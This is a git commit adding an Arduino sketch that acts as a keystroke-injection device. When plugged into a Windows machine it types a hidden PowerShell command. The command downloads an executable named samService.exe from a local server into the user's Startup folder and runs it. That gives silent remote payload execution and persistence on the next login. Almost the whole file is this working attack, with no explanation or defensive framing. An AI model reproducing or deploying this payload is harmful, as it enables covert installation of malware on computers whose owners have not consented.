78855a7533a4843382d0c4abd99fbc82f6faac56
E4STR00T <55939719+Logic-01001010@users.noreply.github.com>
2021-07-15 11:25:59 +0900

    Create scar.ino

---
+++ scar.ino
@@ -0,0 +1,51 @@
+#include <Keyboard.h>
+
+
+
+void RUN(char * cmd)
+{
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(100);
+
+ 
+  Keyboard.print(cmd);
+
+
+  delay(1000);
+
+  Keyboard.press(KEY_RETURN);
+
+  Keyboard.releaseAll();
+
+
+
+
+}
+
+void setup()
+{
+
+  Keyboard.begin(); // 키보드 활성화
+  
+  Serial.begin(9600); // 시리얼 모니터
+
+  delay(1000);
+  
+
+  RUN("%windir%\\system32\\cmd.exe /c powershell -w hidden \"$R = $env:APPDATA+\'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\samService.exe\'; iwr -OutFile $R \"http://127.0.0.1:1479/samService.exe\";start $R\"");
+
+  
+}
+
+void loop()
+{
+ 
+  
+  Serial.write("Hello?");
+  
+  delay(15000);
+}
